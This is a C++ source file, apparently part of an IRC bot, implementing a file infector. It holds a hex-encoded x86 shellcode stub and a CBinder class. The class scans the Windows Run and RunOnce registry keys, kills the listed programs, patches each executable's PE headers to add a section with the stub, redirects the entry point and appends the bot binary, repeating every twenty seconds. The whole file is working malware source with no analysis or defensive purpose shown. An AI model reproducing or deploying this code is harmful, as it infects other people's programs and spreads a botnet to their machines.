#include "includes.h"
//#include "functions.h"
#include "extern.h"

char stub[]=
	"\xE9\xF4\x00\x00\x00\x5A\x56\x57\x50\x51\x53\x89\xD3\xE8\x9B"
	"\x02\x00\x00\x8D\xB3\x1C\x00\x00\x00\x8D\xBB\x25\x00\x00\x00\xC7"
	"\x83\xCB\x00\x00\x00\x0F\x00\x00\x00\xE8\xF5\x01\x00\x00\x89\x83"
	"\xD3\x00\x00\x00\x8D\xBB\x34\x00\x00\x00\xC7\x83\xCB\x00\x00\x00"
	"\x0D\x00\x00\x00\xE8\xDA\x01\x00\x00\x89\x83\xCF\x00\x00\x00\x8D"
	"\xBB\x41\x00\x00\x00\xE8\xB1\x01\x00\x00\x89\x83\xD7\x00\x00\x00"
	"\x8D\xBB\x4D\x00\x00\x00\xE8\xA0\x01\x00\x00\x89\x83\xDB\x00\x00"
	"\x00\x8D\xBB\x57\x00\x00\x00\xE8\x8F\x01\x00\x00\x89\x83\xDF\x00"
	"\x00\x00\x8D\xBB\x60\x00\x00\x00\xE8\x7E\x01\x00\x00\x89\x83\xE3"
	"\x00\x00\x00\x8D\xBB\x8E\x00\x00\x00\xE8\x6D\x01\x00\x00\x89\x83"
	"\xE7\x00\x00\x00\x8D\xBB\x9A\x00\x00\x00\xE8\x5C\x01\x00\x00\x89"
	"\x83\xEB\x00\x00\x00\x8D\xBB\x6C\x00\x00\x00\xE8\x4B\x01\x00\x00"
	"\x89\x83\xEF\x00\x00\x00\x8D\xBB\x7F\x00\x00\x00\xE8\x3A\x01\x00"
	"\x00\x89\x83\xF3\x00\x00\x00\x8D\xB3\xA5\x00\x00\x00\x8D\xBB\xAC"
	"\x00\x00\x00\xE8\x23\x01\x00\x00\x89\x83\xB3\x00\x00\x00\x53\xE8"
	"\x42\x02\x00\x00\x5B\x5B\x59\x58\x5F\x5E\xE8\x07\xFF\xFF\xFF\x00"
	"\x00\x00\x00\x11\x11\x11\x11\x22\x22\x22\x22\x33\x33\x33\x33\x44"
	"\x44\x44\x44\x00\x00\x00\x00\x00\x00\x00\x00\x6B\x65\x72\x6E\x65"
	"\x6C\x33\x32\x00\x47\x65\x74\x50\x72\x6F\x63\x41\x64\x64\x72\x65"
	"\x73\x73\x00\x4C\x6F\x61\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00"
	"\x43\x72\x65\x61\x74\x65\x46\x69\x6C\x65\x41\x00\x57\x72\x69\x74"
	"\x65\x46\x69\x6C\x65\x00\x52\x65\x61\x64\x46\x69\x6C\x65\x00\x43"
	"\x6C\x6F\x73\x65\x48\x61\x6E\x64\x6C\x65\x00\x47\x65\x74\x4D\x6F"
	"\x64\x75\x6C\x65\x46\x69\x6C\x65\x4E\x61\x6D\x65\x41\x00\x53\x65"
	"\x74\x46\x69\x6C\x65\x50\x6F\x69\x6E\x74\x65\x72\x00\x47\x6C\x6F"
	"\x62\x61\x6C\x41\x6C\x6C\x6F\x63\x00\x47\x6C\x6F\x62\x61\x6C\x46"
	"\x72\x65\x65\x00\x6D\x73\x76\x63\x72\x74\x00\x73\x79\x73\x74\x65"
	"\x6D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x62\x6C\x65\x68\x2E\x65\x78\x65\x00\x51\x57\x56\x56\xFF"
	"\x93\xCF\x00\x00\x00\x50\x59\x57\x51\xFF\x93\xD3\x00\x00\x00\x5E"
	"\x5F\x59\xC3\x31\xC0\x89\x83\xC7\x00\x00\x00\x8B\x93\xC7\x00\x00"
	"\x00\x3B\x93\xB7\x00\x00\x00\x7D\x5D\x42\x89\x93\xC7\x00\x00\x00"
	"\x31\xC0\x8B\x83\xC7\x00\x00\x00\xC1\xE0\x02\x8B\x8B\xBF\x00\x00"
	"\x00\x01\xC1\x8B\x01\x03\x43\x18\x57\x56\x51\x89\xFE\x89\xC7\x8B"
	"\x8B\xCB\x00\x00\x00\xF3\xA6\x59\x5E\x5F\x75\xBF\x31\xC0\x8B\x83"
	"\xC7\x00\x00\x00\xD1\xE0\x8B\x8B\xC3\x00\x00\x00\x01\xC1\x31\xC0"
	"\x66\x8B\x01\xC1\xE0\x02\x8B\x8B\xBB\x00\x00\x00\x01\xC8\x8B\x08"
	"\x03\x4B\x18\x89\xC8\xC3\x31\xC0\xC3\xA1\x00\x00\x00\x00\x3E\x8B"
	"\x40\x34\x3E\x8B\xA8\xB8\x00\x00\x00\xE9\x0E\x00\x00\x00\x50\x51"
	"\x56\x55\x64\xA1\x30\x00\x00\x00\x85\xC0\x78\xE2\x3E\x8B\x40\x0C"
	"\x3E\x8B\x70\x1C\xAD\x3E\x8B\x68\x08\x89\x6B\x18\x89\xE8\x66\x81"
	"\x38\x4D\x5A\x75\xC4\x05\x3C\x00\x00\x00\x8B\x08\x03\x4B\x18\x66"
	"\x81\x39\x50\x45\x75\xB3\x81\xC1\x78\x00\x00\x00\x8B\x31\x03\x73"
	"\x18\x81\xC6\x18\x00\x00\x00\xAD\x89\x83\xB7\x00\x00\x00\xAD\x03"
	"\x43\x18\x89\x83\xBB\x00\x00\x00\xAD\x03\x43\x18\x89\x83\xBF\x00"
	"\x00\x00\xAD\x03\x43\x18\x89\x83\xC3\x00\x00\x00\x5D\x5E\x59\x58"
	"\xC3\x8B\x4B\x08\x8B\x53\x14\x01\xCA\x5B\x5B\x5B\x59\x58\x5F\x5E"
	"\x89\x54\x24\x34\xFF\xE2\x89\xD9\x2B\x4B\x04\x66\x31\xC9\x89\x4B"
	"\x14\x68\x04\x01\x00\x00\x68\x40\x00\x00\x00\xFF\x93\xE7\x00\x00"
	"\x00\x89\x83\xFB\x00\x00\x00\x68\x04\x01\x00\x00\x8B\x83\xFB\x00"
	"\x00\x00\x50\x68\x00\x00\x00\x00\xFF\x93\xEF\x00\x00\x00\x68\x00"
	"\x00\x00\x00\x68\x80\x00\x00\x00\x68\x03\x00\x00\x00\x68\x00\x00"
	"\x00\x00\x68\x03\x00\x00\x00\x68\x00\x00\x00\x80\x8B\x83\xFB\x00"
	"\x00\x00\x50\xFF\x93\xD7\x00\x00\x00\x89\x83\xFF\x00\x00\x00\x81"
	"\xBB\xFF\x00\x00\x00\xFF\xFF\xFF\xFF\x0F\x84\x72\xFF\xFF\xFF\x8B"
	"\x83\xFB\x00\x00\x00\x50\xFF\x93\xEB\x00\x00\x00\x68\x00\x00\x00"
	"\x00\x68\x00\x00\x00\x00\x8B\x43\x0C\x50\x8B\x8B\xFF\x00\x00\x00"
	"\x51\xFF\x93\xF3\x00\x00\x00\x8B\x43\x10\x50\x68\x40\x00\x00\x00"
	"\xFF\x93\xE7\x00\x00\x00\x89\x83\xFB\x00\x00\x00\x68\x00\x00\x00"
	"\x00\x8D\x83\xF7\x00\x00\x00\x50\x8B\x4B\x10\x51\x8B\x93\xFB\x00"
	"\x00\x00\x52\x8B\x83\xFF\x00\x00\x00\x50\xFF\x93\xDF\x00\x00\x00"
	"\x8B\x83\xFF\x00\x00\x00\x50\xFF\x93\xE3\x00\x00\x00\x68\x00\x00"
	"\x00\x00\x68\x80\x00\x00\x00\x68\x02\x00\x00\x00\x68\x00\x00\x00"
	"\x00\x68\x03\x00\x00\x00\x68\x00\x00\x00\x40\x8D\x93\x03\x01\x00"
	"\x00\x52\xFF\x93\xD7\x00\x00\x00\x89\x83\xFF\x00\x00\x00\x81\xBB"
	"\xFF\x00\x00\x00\xFF\xFF\xFF\xFF\x0F\x84\xC3\xFE\xFF\xFF\x68\x00"
	"\x00\x00\x00\x8D\x83\xF7\x00\x00\x00\x50\x8B\x4B\x10\x51\x8B\x93"
	"\xFB\x00\x00\x00\x52\x8B\x83\xFF\x00\x00\x00\x50\xFF\x93\xDB\x00"
	"\x00\x00\x8B\x83\xFF\x00\x00\x00\x50\xFF\x93\xE3\x00\x00\x00\x8B"
	"\x83\xFB\x00\x00\x00\x50\xFF\x93\xEB\x00\x00\x00\x8D\x83\x03\x01"
	"\x00\x00\x50\xFF\x93\xB3\x00\x00\x00\xE9\x73\xFE\xFF\xFF";

#define BIND_OFFSET_OFFSET 0x102
#define BIND_OFFSET_ENTY   0x106
#define BIND_OFFSET_FILE   0x10A
#define BIND_OFFSET_BFILE  0x10E

extern char *g_szSectionName;

char *parseargs(char *string)
{	char *p = string;
	while(*p)
	{
		if(*p=='.')
		{
			p++;
			if(*p=='e' || *p=='E')
			{
				p++;
				if(*p=='x' || *p=='X')
				{
					p++;
					if(*p=='e' || *p=='E')
					{
						p++;
						if(*p==' ') *p='\0';
						return string;
					}
				}
			}
		}
		p++;
	}
	return string;
}

DWORD PEAlign(DWORD dwTarNum,DWORD dwAlignTo)
{	
	DWORD dwtemp;
	dwtemp=dwTarNum/dwAlignTo;
	if((dwTarNum%dwAlignTo)!=0)
	{
		dwtemp++;
	}
	dwtemp=dwtemp*dwAlignTo;
	return(dwtemp);
}

struct PSREGKEYS {
	char szName[255];
	char szPath[255];
};

BOOL FindHost(HKEY hRootKey, char *pszSubKey) {
	HKEY hKey;
	int n, i = 0;
	DWORD dwValues = 0;
	PSREGKEYS *psRegKeys;

	n = RegOpenKeyEx(hRootKey, pszSubKey, 0, KEY_ALL_ACCESS,&hKey);
	if (n != ERROR_SUCCESS)
		return false;

	RegQueryInfoKey(hKey, NULL, NULL, NULL, NULL, NULL,
		NULL, &dwValues, NULL, NULL, NULL, NULL);

	psRegKeys = new PSREGKEYS[dwValues];

	for(i = 0; i < (int)dwValues; i++)
	{
		DWORD dwValueNameSize = 512, dwDataSize = 512, dwType;
		unsigned char szValueName[512], szData[512];
	    RegEnumValue(hKey, i, (char *)szValueName, &dwValueNameSize,
		   NULL, &dwType, szData, &dwDataSize);

		strncpy(psRegKeys[i].szName,(char*)szValueName,sizeof(psRegKeys[i].szName));
		strncpy(psRegKeys[i].szPath,(char*)szData,sizeof(psRegKeys[i].szPath));
	}

	RegCloseKey(hKey);

	char szdrive[50]={0}, szdir[MAX_PATH]={0},szfname[MAX_PATH]={0},szext[MAX_PATH]={0}, szfile[MAX_PATH];
	for(i = 0; i < (int)dwValues; i++)
	{
		if(strstr(psRegKeys[i].szPath,g_cMainCtrl.m_cBot.bot_filename.sValue.CStr())!=NULL) continue;
		else if(strstr(psRegKeys[i].szPath,"\\")==NULL) {
			if(Bind(psRegKeys[i].szPath))
			{
				//g_cMainCtrl.m_cIRC.SendFormat(false, false, g_cMainCtrl.m_cBot.scan_channel.sValue.Str(),
					//"CWormRide(0x%8.8Xh): Riding on: %s", this, psRegKeys[i].szPath);
			}
		}
		else if(strstr(psRegKeys[i].szPath,"\\system32\\")!=NULL || strstr(psRegKeys[i].szPath,"\\System32\\")!=NULL) {
			parseargs(psRegKeys[i].szPath);
			_splitpath(psRegKeys[i].szPath,szdrive,szdir,szfname,szext);
			sprintf(szfile,"%s%s",szfname,szext);
			KillProcess(szfile);
			if(Bind(psRegKeys[i].szPath))
			{
				//g_cMainCtrl.m_cIRC.SendFormat(false, false, g_cMainCtrl.m_cBot.scan_channel.sValue.Str(),
					//"CWormRide(0x%8.8Xh): Riding on: %s", this, psRegKeys[i].szPath);
			}

		}
	}
	delete psRegKeys;
	return true;
}

bool CBinder::Map(const char *szFile)
{
	m_iFileSize=0;
	hFile=CreateFile(szFile,GENERIC_READ,FILE_SHARE_WRITE | FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hFile==INVALID_HANDLE_VALUE) return false;

	m_iFileSize=GetFileSize(hFile,0);
	if(m_iFileSize==0) { CloseHandle(hFile); return false; }

	m_iOutSize=m_iFileSize+0x1000;

	m_szBuffer=(char*)GlobalAlloc(GMEM_FIXED | GMEM_ZEROINIT,m_iOutSize);
	if(m_szBuffer==NULL){ CloseHandle(hFile); return false; }

	DWORD dwBytesRead=0;
	ReadFile(hFile,m_szBuffer,m_iFileSize,&dwBytesRead,NULL);
	CloseHandle(hFile);
	return true;
}

void CBinder::UnMap() { m_iFileSize=0; if(m_szBuffer!=NULL) GlobalFree(m_szBuffer); }

bool CBinder::BindedSize(const char *szFile)
{
	m_iBindSize=0;
	hFile=CreateFile(szFile,GENERIC_READ,FILE_SHARE_WRITE | FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hFile==INVALID_HANDLE_VALUE) return false;

	m_iBindSize=GetFileSize(hFile,0);
	if(m_iBindSize==0) { CloseHandle(hFile); return false; }
	CloseHandle(hFile);
	return true;
}

bool CBinder::Bind(const char* szFile)
{
	DWORD i=0;
	CString sOutFileName; 
	GetFilename(sOutFileName.GetBuffer(4096), 4096);

	if(!BindedSize(sOutFileName.CStr())) { return false; }
	//-------------
	// Map file to memory
	//------------
	if(!Map(szFile)) { UnMap(); return false; }

	// --------------------
	// Copy/Check Headers
	// --------------------
	CopyMemory(&sDosHeader,m_szBuffer,sizeof(IMAGE_DOS_HEADER));
	if(sDosHeader.e_magic!='ZM') { UnMap(); return false; }

	CopyMemory(&sNtHeader,m_szBuffer+sDosHeader.e_lfanew,sizeof(IMAGE_NT_HEADERS));
	if(sNtHeader.Signature!='EP') { UnMap(); return false; }

	CopyMemory(&sSecHeader,
		m_szBuffer+sDosHeader.e_lfanew+sizeof(IMAGE_NT_HEADERS),
		sizeof(IMAGE_SECTION_HEADER)*sNtHeader.FileHeader.NumberOfSections);

	// ----------------------------------------------
	// check to see if the file has been infected yet
	// ----------------------------------------------
	for(i=0;i<sNtHeader.FileHeader.NumberOfSections;i++)
	{
		if(strstr((char*)sSecHeader[i].Name,g_szSectionName)!=NULL)
		{ 
			UnMap(); 
			return false; 
		}
	}

	// ---------------
	// Copy Sections
	// ---------------
	for(i=0;i<sNtHeader.FileHeader.NumberOfSections;i++)
	{
		sSecHeader[i].Characteristics= sSecHeader[i].Characteristics | IMAGE_SCN_MEM_WRITE;
		szSec[i]=(char*)GlobalAlloc(GMEM_FIXED | GMEM_ZEROINIT,sSecHeader[i].SizeOfRawData);
		CopyMemory(szSec[i],m_szBuffer+sSecHeader[i].PointerToRawData,sSecHeader[i].SizeOfRawData);
	}

	//----------------------------
	// Append new section header
	//----------------------------
	// make copy of last section as base for new section
	CopyMemory(&sSecHeader[sNtHeader.FileHeader.NumberOfSections],&sSecHeader[sNtHeader.FileHeader.NumberOfSections-1],sizeof(IMAGE_SECTION_HEADER));

	// set section name
	FillMemory(sSecHeader[sNtHeader.FileHeader.NumberOfSections].Name,8,0x00);
	CopyMemory(sSecHeader[sNtHeader.FileHeader.NumberOfSections].Name,g_szSectionName,sizeof(g_szSectionName));

	// set the section characteristics
	sSecHeader[sNtHeader.FileHeader.NumberOfSections].Characteristics=	IMAGE_SCN_MEM_WRITE|
																		IMAGE_SCN_MEM_READ|
																		IMAGE_SCN_MEM_EXECUTE|
																		IMAGE_SCN_CNT_CODE;

	// VirtualAddress...
	sSecHeader[sNtHeader.FileHeader.NumberOfSections].VirtualAddress
		=PEAlign(sSecHeader[sNtHeader.FileHeader.NumberOfSections-1].VirtualAddress+
		         sSecHeader[sNtHeader.FileHeader.NumberOfSections-1].Misc.VirtualSize,
				 sNtHeader.OptionalHeader.SectionAlignment);

	// VirtualSize...
	sSecHeader[sNtHeader.FileHeader.NumberOfSections].Misc.VirtualSize=sizeof(stub);

	// RawSize...
	sSecHeader[sNtHeader.FileHeader.NumberOfSections].SizeOfRawData=0x1000;

	// RawOffset...
	sSecHeader[sNtHeader.FileHeader.NumberOfSections].PointerToRawData
		=PEAlign(sSecHeader[sNtHeader.FileHeader.NumberOfSections-1].PointerToRawData
				+sSecHeader[sNtHeader.FileHeader.NumberOfSections-1].SizeOfRawData,
				sNtHeader.OptionalHeader.FileAlignment);

	// change size of image/code section
	sNtHeader.OptionalHeader.SizeOfCode+=0x1000;
	sNtHeader.OptionalHeader.SizeOfImage+=0x1000;

	// ++ number of sections
	sNtHeader.FileHeader.NumberOfSections++;

	// ----------------------
	// Copy stub to section
	// ----------------------
	CopyMemory(stub+BIND_OFFSET_OFFSET,&sSecHeader[sNtHeader.FileHeader.NumberOfSections-1].VirtualAddress,sizeof(unsigned long));
	CopyMemory(stub+BIND_OFFSET_ENTY,&sNtHeader.OptionalHeader.AddressOfEntryPoint,sizeof(unsigned long));
	CopyMemory(stub+BIND_OFFSET_FILE,&m_iOutSize,sizeof(unsigned long));
	CopyMemory(stub+BIND_OFFSET_BFILE,&m_iBindSize,sizeof(unsigned long));
	CopyMemory(m_szBuffer+sSecHeader[sNtHeader.FileHeader.NumberOfSections-1].PointerToRawData,stub,sizeof(stub));
	//-----------------------
	// Change the entrypoint
	//-----------------------
	sNtHeader.OptionalHeader.AddressOfEntryPoint=sSecHeader[sNtHeader.FileHeader.NumberOfSections-1].VirtualAddress;

	// ---------------------------
	// Copy it back to Memory Map
	// ---------------------------
	CopyMemory(m_szBuffer+sDosHeader.e_lfanew,&sNtHeader,sizeof(IMAGE_NT_HEADERS));
	CopyMemory(m_szBuffer+sDosHeader.e_lfanew+sizeof(IMAGE_NT_HEADERS),
		&sSecHeader,sizeof(IMAGE_SECTION_HEADER)*sNtHeader.FileHeader.NumberOfSections);

	// --------------------------
	// Write it all back to Disk
	// --------------------------
	hFile=CreateFile(szFile,GENERIC_WRITE,FILE_SHARE_WRITE | FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hFile==INVALID_HANDLE_VALUE) { UnMap(); return false; }

	DWORD dwBytesWritten=0;
	SetFilePointer(hFile,0,NULL,FILE_BEGIN);
	WriteFile(hFile,m_szBuffer,m_iOutSize,&dwBytesWritten,NULL);
	CloseHandle(hFile);

	// -----------
	// Clean up
	// -----------
	for(i=0;i<sNtHeader.FileHeader.NumberOfSections;i++)
	{
		GlobalFree(szSec[i]);
	}
	UnMap();

	// ------------
	// Append File
	//-------------
	DWORD dwBytesRead=0;
	hFile=CreateFile(sOutFileName.CStr(),GENERIC_READ,FILE_SHARE_WRITE | FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hFile==INVALID_HANDLE_VALUE) { return false; }

	m_szBuffer=(char*)GlobalAlloc(GMEM_FIXED | GMEM_ZEROINIT,m_iBindSize);
	if(m_szBuffer==NULL){ CloseHandle(hFile); return false; }

	ReadFile(hFile,m_szBuffer,m_iBindSize,&dwBytesRead,NULL);
	CloseHandle(hFile);

	hFile=CreateFile(szFile,GENERIC_WRITE,FILE_SHARE_WRITE | FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hFile==INVALID_HANDLE_VALUE) { return false; }
	SetFilePointer(hFile,0,NULL,FILE_END);
	WriteFile(hFile,m_szBuffer,m_iBindSize,&dwBytesWritten,NULL);
	CloseHandle(hFile);
	GlobalFree(m_szBuffer);

	return true;
}

void *CBinder::Run() {
	m_bRunning=true;
	while(g_cMainCtrl.m_bRunning && m_bRunning) {
		FindHost(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run");
		FindHost(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce");
		FindHost(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx");
		FindHost(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\RunServices");

		FindHost(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run");
		FindHost(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Runonce");
		Sleep(20000);
	}
	return NULL;
}